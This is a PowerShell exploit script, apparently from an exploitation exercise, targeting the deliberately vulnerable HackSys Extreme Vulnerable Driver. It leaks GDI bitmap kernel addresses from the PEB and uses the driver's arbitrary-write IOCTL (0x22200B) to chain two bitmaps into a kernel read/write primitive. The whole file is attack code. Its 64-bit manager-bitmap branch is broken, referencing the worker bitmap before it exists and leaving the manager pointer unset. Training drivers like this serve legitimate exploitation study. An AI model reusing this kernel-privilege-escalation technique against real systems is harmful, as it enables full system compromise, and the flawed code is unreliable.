
```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
[StructLayout(LayoutKind.Sequential)]
public struct _PROCESS_BASIC_INFORMATION
{
public IntPtr ExitStatus;
public IntPtr PebBaseAddress;
public IntPtr AffinityMask;
public IntPtr BasePriority;
public UIntPtr UniqueProcessId;
public IntPtr InheritedFromUniqueProcessId;
}
/// Partial _PEB
[StructLayout(LayoutKind.Explicit, Size = 256)]
public struct _PEB
{
[FieldOffset(148)]
public IntPtr GdiSharedHandleTable32;
[FieldOffset(248)]
public IntPtr GdiSharedHandleTable64;
}
[StructLayout(LayoutKind.Sequential)]
public struct _GDI_CELL
{
public IntPtr pKernelAddress;
public UInt16 wProcessId;
public UInt16 wCount;
public UInt16 wUpper;
public UInt16 wType;
public IntPtr pUserAddress;
}
public static class EVD
{
[DllImport("ntdll.dll")]
public static extern int NtQueryInformationProcess(
IntPtr processHandle,
int processInformationClass,
ref _PROCESS_BASIC_INFORMATION processInformation,
int processInformationLength,
ref int returnLength);
[DllImport("gdi32.dll")]
public static extern IntPtr CreateBitmap(
int nWidth,
int nHeight,
uint cPlanes,
uint cBitsPerPel,
IntPtr lpvBits);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public static extern IntPtr CreateFile(
String lpFileName,
UInt32 dwDesiredAccess,
UInt32 dwShareMode,
IntPtr lpSecurityAttributes,
UInt32 dwCreationDisposition,
UInt32 dwFlagsAndAttributes,
IntPtr hTemplateFile);
[DllImport("Kernel32.dll", SetLastError = true)]
public static extern bool DeviceIoControl(
IntPtr hDevice,
int IoControlCode,
byte[] InBuffer,
int nInBufferSize,
byte[] OutBuffer,
int nOutBufferSize,
ref int pBytesReturned,
IntPtr Overlapped);
}
"@
#==============================================[PEB]
# Flag architecture $x32Architecture/!$x32Architecture
if ([System.IntPtr]::Size -eq 4) {
echo "`n[>] Target is 32-bit!"
$x32Architecture = 1
} else {
echo "`n[>] Target is 64-bit!"
}
# Current Proc handle
$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
# Process Basic Information
$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
$returnLength = New-Object Int
$CallResult = [EVD]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
# PID & PEB address
echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
if ($x32Architecture) {
echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
} else {
echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
}
# Lazy PEB parsing
$_PEB = New-Object _PEB
$_PEB = $_PEB.GetType()
$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
# GdiSharedHandleTable
if ($x32Architecture) {
echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
} else {
echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
}
# _GDI_CELL size
$_GDI_CELL = New-Object _GDI_CELL
$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)
#==============================================[/PEB]
#==============================================[Bitmap]
echo "`n[>] Creating Bitmaps.."
# Manager Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$ManagerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
if ($x32Architecture) {
$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
$ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
$ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
echo "[+] Manager pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
} else {
$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
$WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
$WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
echo "[+] Worker pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}
# Worker Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$WorkerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
if ($x32Architecture) {
$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
$WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
$WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
echo "[+] Worker pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
} else {
$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
$WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
$WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
echo "[+] Worker pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}
#==============================================[/Bitmap]
#==============================================[GDI ring0 primitive]
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
if ($hDevice -eq -1) {
echo "`n[!] Unable to get driver handle..`n"
Return
} else {
echo "`n[>] Driver information.."
echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
echo "[+] Handle: $hDevice"
}
# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
#---
[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WorkerpvScan0).Length)
[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WorkerpvScan0), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WorkerpvScan0).Length)
if ($x32Architecture) {
[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
} else {
[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
}
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x22200B"
[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
#==============================================[/GDI ring0 primitive]
```
